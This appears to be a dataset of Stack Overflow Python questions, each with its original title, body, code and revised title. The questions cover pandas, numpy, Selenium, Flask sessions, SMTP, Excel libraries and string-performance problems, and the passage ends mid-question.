trying to get data from pandas into a SQL server with PYODBC," I am trying to understand how python could pull data from an FTP server into pandas then move this into SQL server. My code here is very rudimentary to say the least and I am looking for any advice or help at all. I have tried to load the data from the FTP server first which works fine.... If I then remove this code and change it to a select from ms sql server it is fine so the connection string works, but the insertion into the SQL server seems to be causing problems. When I remove the ftp code this runs perfectly, but I do not understand how to make the next jump to get this into Microsoft SQL server, or even if it is possible without saving into a file first. <code>  import pyodbcimport pandasfrom ftplib import FTPfrom StringIO import StringIOimport csvftp = FTP ('ftp.xyz.com','user','pass' )ftp.set_pasv(True)r = StringIO()ftp.retrbinary('filname.csv', r.write)pandas.read_table (r.getvalue(), delimiter=',')connStr = ('DRIVER={SQL Server Native Client 10.0};SERVER=localhost;DATABASE=TESTFEED;UID=sa;PWD=pass')conn = pyodbc.connect(connStr)cursor = conn.cursor()cursor.execute(""INSERT INTO dbo.tblImport(Startdt, Enddt, x,y,z,)"" ""VALUES (x,x,x,x,x,x,x,x,x,x.x,x)"")cursor.close()conn.commit()conn.close()print""Script has successfully run!""",Get data from pandas into a SQL server with PYODBC
Selenium: Turning on PhantomJS while testing, I'm making a test of my Django app using Selenium and PhantomJS. I'm debugging a failure of the test. Is there a way to make the headless PhantomJS suddenly show like a real browser on the screen so I could easily debug the problem? <code> ,Show the page while testing with PhantomJS through Selenium
using haversine formula with data stored in a pandas dataframe," I know that to find the distance between two latitude, longitude points I need to use the haversine function: I have a DataFrame where one column is latitude and another column is longitude. I want to find out how far these points are from a set point, -56.7213600, 37.2175900. How do I take the values from the DataFrame and put them into the function? example DataFrame: <code>  def haversine(lon1, lat1, lon2, lat2): lon1, lat1, lon2, lat2 = map(radians, [lon1, lat1, lon2, lat2]) dlon = lon2 - lon1 dlat = lat2 - lat1 a = sin(dlat/2)**2 + cos(lat1) * cos(lat2) * sin(dlon/2)**2 c = 2 * asin(sqrt(a)) km = 6367 * c return km SEAZ LAT LON1 296.40, 58.7312210, 28.3774110 2 274.72, 56.8148320, 31.29232403 192.25, 52.0649880, 35.80186404 34.34, 68.8188750, 67.19336705 271.05, 56.6699880, 31.68806206 131.88, 48.5546220, 49.78277307 350.71, 64.7742720, 31.39537808 214.44, 53.5192920, 33.84585609 1.46, 67.9433740, 38.484252010 273.55, 53.3437310, 4.4716664",Vectorised Haversine formula with a pandas dataframe
Strange asignment in numpy arrays," I have a numpy array A with n rows of size 3. Each row is composed by three integers, each one is a integer which refers to another position inside the numpy array. For example If I want the rows refered by N[4], I use N[N[4]]. Visually: I am building a function that modifies N, and I need to modify N[N[x]] for some specified x which is a parameter too (4 in the example). I want to change all the 6 in the subarray for another number (let's say 0), so I use numpy.where to find the indexes, which are Now, if I replace directly like N[N[4]][where_is_6] = 0 there is no change. If I make a previous reference like var = N[N[4]] and then var[where_is_6] the change is done but locally to the function and N is not changed globally. What can I do in this case? or what am I doing wrong? <code>  N = np.array([[2, 3, 6], [12, 6, 9], [3, 10, 7], [8, 5, 6], [3, 1, 0] ... ])N[4] = [3, 1 ,0]N[N[4]] = [[8, 5, 6] [12, 6, 9] [2, 3, 6]] where_is_6 = np.where(N[N[4]] == 6)",Strange assignment in numpy arrays
Sort list by frequency in python," Is there any way in Python, wherein I can sort a list by its frequency?For example, the above list would be sorted in the order of the frequency of its values to create the following list, where the item with the greatest frequency is placed at the front: <code>  [1,2,3,4,3,3,3,6,7,1,1,9,3,2] [3,3,3,3,3,1,1,1,2,2,4,6,7,9]",Sort list by frequency
Open and close new tab with Selenium Webdriver in OSx, I'm using the Firefox Webdriver in Python 2.7 on Windows to simulate opening (Ctrl+t) and closing (Ctrl + w) a new tab.Here's my code: How to achieve the same on a Mac?Based on this comment one should use browser.find_element_by_tag_name('body').send_keys(Keys.COMMAND + 't') to open a new tab but I don't have a Mac to test it and what about the equivalent of Ctrl-w?Thanks! <code>  from selenium import webdriver from selenium.webdriver.common.keys import Keysbrowser = webdriver.Firefox()browser.get('https://www.google.com')main_window = browser.current_window_handle# open new tabbrowser.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')browser.get('https://www.yahoo.com')# close tabbrowser.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 'w'),Open and close new tab with Selenium WebDriver in OS X
Is it a bug to omit an Accept */* header in an HTTP Request for a REST API," I'm trying to determine whether it is a bug that Python's urllib.urlopen() function omits an HTTP Accept header when making simple REST API requests.The Facebook Graph API seems to notice whether the header is present or not: Without the accept header, the returned content-type of application/json; charset=UTF-8 becomes text/javascript; charset=UTF-8. That may be a bug in Facebook's REST API or it may be a legitimate response to a missing accept header.I notice the command-line tools like curl use Accept: */* by default: Likewise, the Python requests package also uses Accept: */* as a default: I presume that curl and requests add the default for a reason, but I'm not sure what that reason is.RFC 2616 for HTTP/1.1 says that */* indicates all media types and that if no Accept header field is present, then it is assumed that the client accepts all media types. This would seem to indicate that Accept: */* is optional and its omission would have no effect. That said, Python is using HTTP/1.0 and the RFCs are silent about the effect of omitting the header.I would like to determine whether the best practice is to include Accept: */* as curl and requests do or whether it is okay to omit is as Python's urllib.urlopen() does. The question is important because I'm in a position to fix urllib.urlopen() if it is determined to be buggy or if it is problematic for use with REST APIs as commonly implemented using HTTP/1.0: The related questions on StackOverflow aren't helpful for this question. What does 'Accept: */*' mean under Client section of Request Headers? asks what */* means (we already know that it means all media types) and Send a curl request with no Accept header? asks how to omit the accept header in a curl request. My question focuses on whether you should include */* and whether it is a bug to omit it.  <code>  GET /zuck HTTP/1.0Host: graph.facebook.comAccept: */* $ curl -v https://graph.facebook.com/zuck> GET /zuck HTTP/1.1> User-Agent: curl/7.30.0> Host: graph.facebook.com> Accept: */* def default_headers(): return CaseInsensitiveDict({ 'User-Agent': default_user_agent(), 'Accept-Encoding': ', '.join(('gzip', 'deflate')), 'Accept': '*/*', 'Connection': 'keep-alive', }) >>> import httplib>>> httplib.HTTPConnection.debuglevel = 1>>> import urllib>>> u = urllib.urlopen('https://graph.facebook.com/zuck')send: 'GET /zuck HTTP/1.0\r\nHost: graph.facebook.com\r\nUser-Agent: Python-urllib/1.17\r\n\r\n'",Is it a bug to omit an Accept */* header in an HTTP/1.0 Request for a REST API
How to execute a curl command within a python script?," I am trying to execute a curl command within a python script.If I do it in the terminal, it looks like this: I've seen recommendations to use pycurl, but I couldn't figure out how to apply it to mine.I tried using: and it works, but is there a better way? <code>  curl -X POST -d '{""nw_src"": ""10.0.0.1/32"", ""nw_dst"": ""10.0.0.2/32"", ""nw_proto"": ""ICMP"", ""actions"": ""ALLOW"", ""priority"": ""10""}' http://localhost:8080/firewall/rules/0000000000000001 subprocess.call([ 'curl', '-X', 'POST', '-d', flow_x, 'http://localhost:8080/firewall/rules/0000000000000001'])",Execute curl command within a Python script
python overload primitives," I'm trying to overload some methods of the string builtin.I know there is no really legitimate use-case for this, but the behavior still bugs me so I would like to get an explanation of what is happening here:Using Python2, and the forbiddenfruit module. As you can see, the __repr__ function as been successfully overloaded, but isn't actually called when when we ask for a representation. Why is that?Then, how would you do to get the expected behaviour: There is no constraint about setting up a custom environment, if rebuilding python is what it takes, so be it, but I really don't know where to start, and I still hope there is a easier way :) <code>  >>> from forbiddenfruit import curse>>> curse(str, '__repr__', lambda self:'bar')>>> 'foo''foo'>>> 'foo'.__repr__()'bar' >>> 'foo''bar'",Python overload primitives
secret key not set in flask session," Right now I am using a flask 3rd party library Flask-Session and I am having no luck getting a session working.When I connect to my site, I get the following error:RuntimeError: the session is unavailable because no secret key wasset. Set the secret_key on the application to something unique andsecret.Below is my server code. As you can see, I do set the app secret key. What am I doing wrong?Are there other session options?Other info:Running Python 2.7 on Linux MintFull paste: <code>  from flask import Flask, sessionfrom flask.ext.session import SessionSESSION_TYPE = 'memcache' app = Flask(__name__)sess = Session()nextId = 0def verifySessionId(): global nextId if not 'userId' in session: session['userId'] = nextId nextId += 1 sessionId = session['userId'] print (""set userid["" + str(session['userId']) + ""]"") else: print (""using already set userid["" + str(session['userId']) + ""]"") sessionId = session.get('userId', None) return sessionId@app.route(""/"")def hello(): userId = verifySessionId() print(""User id["" + str(userId) + ""]"") return str(userId)if __name__ == ""__main__"": app.secret_key = 'super secret key' sess.init_app(app) app.debug = True app.run() Traceback (most recent call last): File ""/home/sean/code/misc/hangman/venv/lib/python2.7/site-packages/flask/app.py"", line 1836, in __call__ return self.wsgi_app(environ, start_response) File ""/home/sean/code/misc/hangman/venv/lib/python2.7/site-packages/flask/app.py"", line 1820, in wsgi_app response = self.make_response(self.handle_exception(e)) File ""/home/sean/code/misc/hangman/venv/lib/python2.7/site-packages/flask/app.py"", line 1403, in handle_exception reraise(exc_type, exc_value, tb) File ""/home/sean/code/misc/hangman/venv/lib/python2.7/site-packages/flask/app.py"", line 1817, in wsgi_app response = self.full_dispatch_request() File ""/home/sean/code/misc/hangman/venv/lib/python2.7/site-packages/flask/app.py"", line 1477, in full_dispatch_request rv = self.handle_user_exception(e) File ""/home/sean/code/misc/hangman/venv/lib/python2.7/site-packages/flask/app.py"", line 1381, in handle_user_exception reraise(exc_type, exc_value, tb) File ""/home/sean/code/misc/hangman/venv/lib/python2.7/site-packages/flask/app.py"", line 1475, in full_dispatch_request rv = self.dispatch_request() File ""/home/sean/code/misc/hangman/venv/lib/python2.7/site-packages/flask/app.py"", line 1461, in dispatch_request return self.view_functions[rule.endpoint](**req.view_args) File ""/home/sean/code/misc/session/sessiontest.py"", line 27, in hello userId = verifySessionId() File ""/home/sean/code/misc/session/sessiontest.py"", line 16, in verifySessionId session['userId'] = nextId File ""/home/sean/code/misc/hangman/venv/lib/python2.7/site-packages/werkzeug/local.py"", line 341, in __setitem__ self._get_current_object()[key] = value File ""/home/sean/code/misc/hangman/venv/lib/python2.7/site-packages/flask/sessions.py"", line 126, in _fail raise RuntimeError('the session is unavailable because no secret 'RuntimeError: the session is unavailable because no secret key was set. Set the secret_key on the application to something unique and secret.","secret key not set in flask session, using the Flask-Session extension"
"Using pandas dataframe, how to make a row as column header?", The data I have to work with is a bit messy.. It has header names inside of its data. How can I choose a row from an existing pandas dataframe and make it (rename it to) a column header?I want to do something like: <code>  header = df[df['old_header_name1'] == 'new_header_name1']df.columns = header,"Convert row to column header for Pandas DataFrame,"
Python/curses user input while," I'm currently coding an app U.I with python/curses and I was wondering if it is possible to ask the user to press keys (cbreak mode) to hide or show some panels or windows while the U.I is continuously updating.I read the official python docs about curses and made some tries but even with the use of the cbreak mode and the non-blocking input mode (nodelay) activated I am unable to make it work properly (I succeed in getting the user input but at the expense of blocking the U.I that is not what I want).So my question is simple, is it possible ? And if yes, how ?I may have mis-read the docs but I haven't found any alternative docs or example about it.I thought about making the app multi-threaded but I didn't see how this can help me in this case.Thank you for your help, advices or pointer to a detailed doc.EDIT :I finally ended up with the following multi-threaded code but it's not satisfying. The U.I is feeded as it has to be but after refreshing the display is borked.I also do not understand why the curses.panel.hidden() returns False while the considered panel is hidden. It seems that refreshing the window associated with the panel unhide the panel or something like that. I'm really lost at this point ! <code>  import threadingimport curses, curses.panelimport randomimport timegui = Noneclass ui: def __init__(self): self.feeder = feeder(self) self.stdscr = curses.initscr() curses.noecho() curses.cbreak() curses.curs_set(0) self.stdscr.keypad(1) self.win1 = curses.newwin(10, 50, 0, 0) self.win1.border(0) self.pan1 = curses.panel.new_panel(self.win1) self.win2 = curses.newwin(10, 50, 0, 0) self.win2.border(0) self.pan2 = curses.panel.new_panel(self.win2) self.win3 = curses.newwin(10, 50, 12, 0) self.win3.border(0) self.pan3 = curses.panel.new_panel(self.win3) self.win1.addstr(1, 1, ""Window 1"") self.win2.addstr(1, 1, ""Window 2"") self.win3.addstr(1, 1, ""Press 's' to switch windows or 'q' to quit."") self.pan1.hide() self.win1.refresh() curses.panel.update_panels() self.win2.refresh() self.feeder.start() def ask(self): while True: self.win3.addstr(5,1, ""Hidden = win1: ""+str(self.pan1.hidden())+\ ""win2:""+str(self.pan2.hidden()), 0) self.win3.refresh() k = self.win3.getkey() if k == 's': if self.pan1.hidden(): self.pan2.hide() self.pan1.show() self.win1.refresh() self.win3.addstr(2, 1, ""Pan1 restored"") else: self.pan1.hide() self.pan2.show() self.win2.refresh() self.win3.addstr(2, 1, ""Pan2 restored"") self.win3.addstr(5,1, ""Hidden = win1: ""+\ str(self.pan1.hidden())+\ "" win2:""+str(self.pan2.hidden()), 0) elif k == 'q': break self.quit_ui() def quit_ui(self): self.feeder.stop() curses.nocbreak() self.stdscr.keypad(0) curses.curs_set(1) curses.echo() curses.endwin() exit(0) def display_data(self, window, data): window.addstr(3, 1, data, 0)class feeder(threading.Thread): # Fake U.I feeder def __init__(self, ui): super(feeder, self).__init__() self.running = False self.ui = ui self.count = 0 def stop(self): self.running = False def run(self): self.running = True self.feed() def feed(self): while self.running: self.ui.win1.addstr(3, 1, str(self.count)+\ "": ""+str(int(round(random.random()*9999)))) self.ui.win1.addstr(4, 1, str(self.running)) self.ui.win2.addstr(3, 1, str(self.count)+\ "": ""+str(int(round(random.random()*9999)))) self.ui.win2.addstr(4, 1, str(self.running)) time.sleep(0.5) self.count += 1if __name__ == ""__main__"": gui = ui() gui.ask()",Python/curses user input while updating screen
numpy elegant expression of row-wise dot product," I have two 2-d numpy arrays with the same dimensions, A and B, and am trying to calculate the row-wise dot product of them. I could do: Is there another way to do this so that numpy is doing the row-wise dot product in one step rather than two? Maybe with tensordot? <code>  np.sum(A * B, axis=1)",Elegant expression for row-wise dot product of two matrices
Python: swapping maximum and minimum values in a list," Given a list (for instance, [1,1,2,1,2,2,3]) which is not sorted highest to lowest, and contains multiples of all numbers, I need to swap, in place, the maximums with the minimums, the second maxes with the second mins, etc. So, our example list would become [3,3,2,3,2,2,1].Also, just to clarify, it's not just the max and min, but each layer of maxes and mins. So if the max was 4, 1's and 4's should switch as well as 2's and 3's.I found this question on the topic: How to swap maximums with the minimums? (python)but the code examples given seemed verbose, and assumed that there were no duplicates in the list. Is there really no better way to do this? It seems like a simple enough thing. <code> ",Swapping maximum and minimum values in a list
"np.full(size, 0) vs. np.zeros(size)"," If you were to choose one of the following three ways of initializing an array with zeros which one would you choose and why? or or <code>  my_arr_1 = np.full(size, 0) my_arr_2 = np.zeros(size) my_arr_3 = np.empty(size)my_arr_3[:] = 0","np.full(size, 0) vs. np.zeros(size) vs. np.empty()"
Whaaaaat is going on," I am creating symmetric matrices/arrays in Python with NumPy, using a standard method: Now let's be clever: Wait, what? The upper left and lower right segments are symmetrical. What if I chose a smaller array? OK.... And just to be sure... Is this a bug, or am I about to learn something crazy about += and NumPy arrays? <code>  x = rand(500,500)x = (x+x.T)all(x==x.T)> True x = rand(500,500)x += x.Tall(x==x.T)> False x==x.T> array([[ True, True, True, ..., False, False, False], [ True, True, True, ..., False, False, False], [ True, True, True, ..., False, False, False], ..., [False, False, False, ..., True, True, True], [False, False, False, ..., True, True, True], [False, False, False, ..., True, True, True]], dtype=bool) x = rand(50,50)x += x.Tall(x==x.T)> True x = rand(90,90)x += x.Tall(x==x.T)> Truex = rand(91,91)x += x.Tall(x==x.T)> False x = rand(91,91)x = (x+x.T)all(x==x.T)> True",Unexpected result with += on NumPy arrays
Whaaaaat is going on with += and Numpy arrays," I am creating symmetric matrices/arrays in Python with NumPy, using a standard method: Now let's be clever: Wait, what? The upper left and lower right segments are symmetrical. What if I chose a smaller array? OK.... And just to be sure... Is this a bug, or am I about to learn something crazy about += and NumPy arrays? <code>  x = rand(500,500)x = (x+x.T)all(x==x.T)> True x = rand(500,500)x += x.Tall(x==x.T)> False x==x.T> array([[ True, True, True, ..., False, False, False], [ True, True, True, ..., False, False, False], [ True, True, True, ..., False, False, False], ..., [False, False, False, ..., True, True, True], [False, False, False, ..., True, True, True], [False, False, False, ..., True, True, True]], dtype=bool) x = rand(50,50)x += x.Tall(x==x.T)> True x = rand(90,90)x += x.Tall(x==x.T)> Truex = rand(91,91)x += x.Tall(x==x.T)> False x = rand(91,91)x = (x+x.T)all(x==x.T)> True",Unexpected result with += on NumPy arrays
Failure to create symmetric matrix with += on Numpy arrays," I am creating symmetric matrices/arrays in Python with NumPy, using a standard method: Now let's be clever: Wait, what? The upper left and lower right segments are symmetrical. What if I chose a smaller array? OK.... And just to be sure... Is this a bug, or am I about to learn something crazy about += and NumPy arrays? <code>  x = rand(500,500)x = (x+x.T)all(x==x.T)> True x = rand(500,500)x += x.Tall(x==x.T)> False x==x.T> array([[ True, True, True, ..., False, False, False], [ True, True, True, ..., False, False, False], [ True, True, True, ..., False, False, False], ..., [False, False, False, ..., True, True, True], [False, False, False, ..., True, True, True], [False, False, False, ..., True, True, True]], dtype=bool) x = rand(50,50)x += x.Tall(x==x.T)> True x = rand(90,90)x += x.Tall(x==x.T)> Truex = rand(91,91)x += x.Tall(x==x.T)> False x = rand(91,91)x = (x+x.T)all(x==x.T)> True",Unexpected result with += on NumPy arrays
+= on Numpy arrays not behaving as expected," I am creating symmetric matrices/arrays in Python with NumPy, using a standard method: Now let's be clever: Wait, what? The upper left and lower right segments are symmetrical. What if I chose a smaller array? OK.... And just to be sure... Is this a bug, or am I about to learn something crazy about += and NumPy arrays? <code>  x = rand(500,500)x = (x+x.T)all(x==x.T)> True x = rand(500,500)x += x.Tall(x==x.T)> False x==x.T> array([[ True, True, True, ..., False, False, False], [ True, True, True, ..., False, False, False], [ True, True, True, ..., False, False, False], ..., [False, False, False, ..., True, True, True], [False, False, False, ..., True, True, True], [False, False, False, ..., True, True, True]], dtype=bool) x = rand(50,50)x += x.Tall(x==x.T)> True x = rand(90,90)x += x.Tall(x==x.T)> Truex = rand(91,91)x += x.Tall(x==x.T)> False x = rand(91,91)x = (x+x.T)all(x==x.T)> True",Unexpected result with += on NumPy arrays
+= on NumPy arrays not behaving as expected," I am creating symmetric matrices/arrays in Python with NumPy, using a standard method: Now let's be clever: Wait, what? The upper left and lower right segments are symmetrical. What if I chose a smaller array? OK.... And just to be sure... Is this a bug, or am I about to learn something crazy about += and NumPy arrays? <code>  x = rand(500,500)x = (x+x.T)all(x==x.T)> True x = rand(500,500)x += x.Tall(x==x.T)> False x==x.T> array([[ True, True, True, ..., False, False, False], [ True, True, True, ..., False, False, False], [ True, True, True, ..., False, False, False], ..., [False, False, False, ..., True, True, True], [False, False, False, ..., True, True, True], [False, False, False, ..., True, True, True]], dtype=bool) x = rand(50,50)x += x.Tall(x==x.T)> True x = rand(90,90)x += x.Tall(x==x.T)> Truex = rand(91,91)x += x.Tall(x==x.T)> False x = rand(91,91)x = (x+x.T)all(x==x.T)> True",Unexpected result with += on NumPy arrays
why is dict literal preferred over dict constructor," Why is the Python dict constructor slower than the using literal syntax?After hot debate with my colleague, I did some comparison and got the following statistics: What is the reason the constructor is slower? And in what situations, if any, would it be faster? <code>  python2.7 -m timeit ""d = dict(x=1, y=2, z=3)""1000000 loops, best of 3: 0.47 usec per looppython2.7 -m timeit ""d = {'x': 1, 'y': 2, 'z': 3}""10000000 loops, best of 3: 0.162 usec per loop",Why is the dict literal syntax preferred over the dict constructor?
Find if 24 hrs have passed between datetimes - Python," I have the following method: I want to find out if 24 hrs have passed since last_updated, how can I do that in Python? <code>  # last_updated is a datetime() object, representing the last time this program randef time_diff(last_updated): day_period = last_updated.replace(day=last_updated.day + 1, hour=1, minute=0, second=0, microsecond=0) delta_time = day_period - last_updated hours = delta_time.seconds // 3600 # make sure a period of 24hrs have passed before shuffling if hours >= 24: print ""hello"" else: print ""do nothing""",Find if 24 hrs have passed between datetimes
Calculated column in Pandas pivot table, I have created a pandas data frame and then converted it into pivot table.My pivot table looks like this: I was wondering how to add calculated columns so that I get my pivot table with Autopass% (Autopass(cb)/TotalCB*100) just like we are able to create them in Excel using calculated field option.I want my pivot table output to be something like below: How do I define the function which calculates the percentage columns and how to apply that function to my two columns namely Qd(cb) and Autopass(cb) to give me additional calculated columns <code>  Operators TotalCB Qd(cb) Autopass(cb)Aircel India 55 11 44Airtel Ghana 20 17 3Airtel India 41 9 9Airtel Kenya 9 4 5Airtel Nigeria 24 17 7AT&T USA 18 10 8 Operators TotalCB Qd(cb) Autopass(cb) Qd(cb)% Autopass(cb)%Aircel India 55 11 44 20% 80%Airtel Ghana 20 17 3 85% 15%Airtel India 41 29 9 71% 22%Airtel Kenya 9 4 5 44% 56%AT&T USA 18 10 8 56% 44%,Add calculated column to a pandas pivot table
Any way to create a new Worksheet using Xlwings?," Using Python xlwings, how can I create a new worksheet? <code> ",Any way to create a new worksheet using xlwings?
Python format Integer into fIxed length of strings, I want to generate a string based on an int along with zeros. And the length should always be of 5 not more then that nor less. <code>  For example:Consider a Integer: 1Formatted String : 00001Consider a Integer: 12Formatted String : 00012Consider a Integer: 110Formatted String : 00110Consider a Integer: 1111Formatted String : 01111Consider a Integer: 11111Formatted String : 11111,Python format Integer into fixed length strings
Python Ctypes: Convert returned C array to python list," I am using Python Ctypes to access some C library.One of the functions I connected to, returns const *double, which is actually an array of doubles.When I get the result in Python, how can I convert this array to a python list?The signature of the C function: Let's assume that it returns an array that contains 0.13 and 0.12.I want to get a python List: [0.13, 0.12] <code>  const double *getWeights();","Python Ctypes: Convert returned C array to python list, WITHOUT numpy"
Merge CSVs in python with different columns," I have hundreds of large CSV files that I would like to merge into one. However, not all CSV files contain all columns. Therefore, I need to merge files based on column name, not column position.Just to be clear: in the merged CSV, values should be empty for a cell coming from a line which did not have the column of that cell.I cannot use the pandas module, because it makes me run out of memory.Is there a module that can do that, or some easy code? <code> ",Merge CSVs in Python with different columns
Python execute random function," Consider the following functions: Is there a way to pick a function to run randomly? I tried using: but it returns both functions, I just want it to return one function. <code>  def a(): print ""a""def b(): print ""b"" random.choice([a(),b()])",Execute a function randomly
Horyzontal text alignment in openpyxl," I'm trying to change the text alignment to the center of 2 merged cells. I've found some answers that didn't work for my case: both didn't work, is there any other way to do it? <code>  currentCell = ws.cell('A1')currentCell.style.alignment.horizontal = 'center' #TypeError: cannot set horizontal attribute#orcurrentCell.style.alignment.vertical = Alignment.HORIZONTAL_CENTER #AttributeError: type object 'Alignment' has no attribute 'HORIZONTAL_CENTER'",Horizontal text alignment in openpyxl
Not sure how to use argv with Spyder," I'm running the code below in Spyder.I have typed it in a py file and simply hit the run button.When I try to run it I get the error:ValueError: need more than 1 value to unpackAs shown here you are meant to give the inputs for the argv variable before running the program but I don't know how to do this is spyder? http://learnpythonthehardway.org/book/ex13.html <code>  from sys import argvscript, first, second, third = argvprint ""The script is called:"", scriptprint ""The first variable is:"", firstprint ""The second variable is:"", secondprint ""Your third variable is:"", third",How to use argv with Spyder
PyPi description markdown doesn't work," I uploaded a package to PyPi using: I'm trying to modify the description, I wrote (please don't edit the formatting of the following piece of code, I made it on purpose to demonstrate my problem): However, the text appears as it is, without the markdown formatting. What am I doing wrong? <code>  python setup.py register -r pypipython setup.py sdist upload -r pypi **my plugin**This plugin enables you to ... For example:```python@attr(section='MySection', id=1)def test_function(self): """""" Bla bla bla """""" pass```",How to make PyPi description Markdown work?
Python Panfas Pivot - Why Fails," I have tried for a while to get this to wrk and I can't - I read the documentation and I must be misunderstanding somethingI have a Data Frame in long format and I want to make it wide - this is quite common. But I get an error the error I get is (the lats part, as they are quite extensive): ValueError: cannot label index with a null keyI tried this in python (notebook) and also on regular python c command line in OS X with the same resultThanks for any insight, I am sure it will be something basic <code>  from pandas import DataFrame data = DataFrame({'value' : [1,2,3,4,5,6,7,8,9,10,11,12], 'group' : ['a','a','a','b','b','b','b','c','c','c','d','d']})data.pivot(columns='group')",Python Pandas Pivot - Why Fails
does xlsxwriter get a template from another xls file?, Can xlsxwriter object use a template of another excel file?I tried to use xlsr but it can't use a template.I am using xlsxwriter since I am writing more the 65335 lines.Thanks. <code> ,Can xlsxwriter use another file as a template?
SMTPAuthenticationError when sending mail using gmail and ptthon," when i try to send mail using gmail and python error occurred this type of question are already in this site but doesn't help to me error: <code>  gmail_user = ""me@gmail.com""gmail_pwd = ""password""TO = 'friend@gmail.com'SUBJECT = ""Testing sending using gmail""TEXT = ""Testing sending mail using gmail servers""server = smtplib.SMTP('smtp.gmail.com', 587)server.ehlo()server.starttls()server.login(gmail_user, gmail_pwd)BODY = '\r\n'.join(['To: %s' % TO, 'From: %s' % gmail_user, 'Subject: %s' % SUBJECT, '', TEXT])server.sendmail(gmail_user, [TO], BODY)print ('email sent') server.login(gmail_user, gmail_pwd) File ""/usr/lib/python3.4/smtplib.py"", line 639, in login raise SMTPAuthenticationError(code, resp) smtplib.SMTPAuthenticationError: (534, b'5.7.14 <https://accounts.google.com/ContinueSignIn?sarp=1&scc=1&plt=AKgnsbtl1\n5.7.14 Li2yir27TqbRfvc02CzPqZoCqope_OQbulDzFqL-msIfsxObCTQ7TpWnbxIoAaQoPuL9ge\n5.7.14 BUgbiOqhTEPqJfb02d_L6rrdduHSxv26s_Ztg_JYYavkrqgs85IT1xZYwtbWIRE8OIvQKf\n5.7.14 xxtT7ENlZTS0Xyqnc1u4_MOrBVW8pgyNyeEgKKnKNyxce76JrsdnE1JgSQzr3pr47bL-kC\n5.7.14 XifnWXg> Please log in via your web browser and then try again.\n5.7.14 Learn more at\n5.7.14 https://support.google.com/mail/bin/answer.py?answer=78754 fl15sm17237099pdb.92 - gsmtp') ",SMTPAuthenticationError when sending mail using gmail and python
Python unitests run function after all test," I need to test smth on python via ssh. I don't want to make ssh connection for every test, because it is to long, I have written this: and my runner In this version I get error TypeError: unbound method disconnect() must be called with TestCase instance as first argument (got nothing instead). So how i can call disconnect after all tests pass?With best regards. <code>  class TestCase(unittest.TestCase): client = None def setUp(self): if not hasattr(self.__class__, 'client') or self.__class__.client is None: self.__class__.client = paramiko.SSHClient() self.__class__.client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) self.__class__.client.connect(hostname=consts.get_host(), port=consts.get_port(), username=consts.get_user(), password=consts.get_password()) def test_a(self): pass def test_b(self): pass def test_c(self): pass def disconnect(self): self.__class__.client.close() if __name__ == '__main__': suite = unittest.TestSuite(( unittest.makeSuite(TestCase), )) result = unittest.TextTestRunner().run(suite) TestCase.disconnect() sys.exit(not result.wasSuccessful())",Python unit tests run function after all test
Is there a way to find out if A is a 'sub' matrix of B?," I give quotation mark because what I mean is for example: suppose we select row 2,4 and col 1,3, the intersections will give us My question is suppose I have A and B, is there a way that I can find out which rows and cols are selected from B to give A?By the way it would be best if you can give the answer in python/numpy. But just in math or in other programming language will be fine as well. <code>  B = [[1,2,3,4,5], [6,7,8,9,10], [11,12,13,14,15], [16,17,18,19,20]] A = [[6,8], [16,18]]",Is there a way to find out if A is a submatrix of B?
Python: xlrd and xlwt. Edit existing workbooks and sheets," In the documentation for xlrd and xlwt I have learned the following:How to read from existing work-books/sheets: How to create new work-books/sheets: What I want to do now is to open an existing worksheet, in an existing workbook and write to that sheet.I have tried something like: but open_workbook is only part of the xlrd module, not xlwt.Any ideas?Edit1:After Olivers suggestion I looked into xlutils and tried the following: This however, gives me the following error message: Edit 2:The error message was due to improper use of the get_sheet function.Finally found out how to use it: <code>  from xlrd import open_workbookwb = open_workbook(""ex.xls"")s = wb.sheet_by_index(0)print s.cell(0,0).value#Prints contents of cell at location a1 in the first sheet in the document called ex.xls from xlwt import Workbookwb = Workbook()Sheet1 = wb.add_sheet('Sheet1')Sheet1.write(0,0,'Hello')wb.save('ex.xls')#Creates a document called ex.xls with a worksheet called ""Sheet1"" and writes ""Hello"" to the cell located at a1 from xlwt import open_workbookwb = open_workbook(""ex.xls"")s = wb.sheet_by_index(0)print s.cell(0,0).value from xlrd import open_workbookfrom xlwt import Workbookfrom xlutils.copy import copywb = open_workbook(""names.xls"")s = wb.get_sheet(0)s.write(0,0,'A1')wb.save('names.xls') File ""C:\Python27\lib\site-packages\xlrd\book.py"", line 655, in get_sheetraise XLRDError(""Can't load sheets after releasing resources."")xlrd.biffh.XLRDError: Can't load sheets after releasing resources. from xlrd import open_workbookfrom xlwt import Workbookfrom xlutils.copy import copyrb = open_workbook(""names.xls"")wb = copy(rb)s = wb.get_sheet(0)s.write(0,0,'A1')wb.save('names.xls')",Edit existing excel workbooks and sheets with xlrd and xlwt
Python find min max and average of a list (array)," I am having hard time to figure out how to find min from a listfor example how can I find min and max of this list with defining (def) a functionI do not want to use built-in function min <code>  somelist = [1,12,2,53,23,6,17]","Find min, max, and average of a list"
Python cstringIO take more time than StringIO in writing (Performance of String methods)," In my way to profile string methods in python so that I can use the fastest one.I have this code to test string concatenation in files, StringIO, StringIO and normal string. While the Python documentation site says that cStringIO is faster than StringIO but the results says that StringIO has better performance in concatenation, why?The other hand is that, reading from cStringIO is faster than StringIO (its behavior similar to file), as I read the implementation of file and cStringIO are in C, so why string concatenation is slow?Is there any other way to deal with string more faster than these methods? <code>  #!/usr/bin/env python#title : pythonTiming.py#description : Will be used to test timing function in python#author : myusuf#date : 19-11-2014#version : 0#usage :python pythonTiming.py#notes :#python_version :2.6.6 #==============================================================================import timeimport cStringIOimport StringIOclass Timer(object): def __enter__(self): self.start = time.time() return self def __exit__(self, *args): self.end = time.time() self.interval = self.end - self.starttestbuf = """""" Hello This is a General String that will be repreatedThis string will be written to a file , StringIO and a sregualr strin then see the best to handle string according to time """""" * 1000MyFile = open(""./testfile.txt"" ,""wb+"")MyStr = ''MyStrIo = StringIO.StringIO()MycStrIo = cStringIO.StringIO()def strWithFiles(): global MyFile print ""writing string to file "" for index in range(1000): MyFile.write(testbuf) passdef strWithStringIO(): global MyStrIo print ""writing string to StrinIO "" for index in range(1000): MyStrIo.write(testbuf)def strWithStr(): global MyStr print ""Writing String to STR "" for index in range(500): MyStr = MyStr + testbufdef strWithCstr(): global MycStrIo print ""writing String to Cstring"" for index in range(1000): MycStrIo.write(testbuf)with Timer() as t: strWithFiles()print('##Request took %.03f sec.' % t.interval)with Timer() as t: strWithStringIO()print('###Request took %.03f 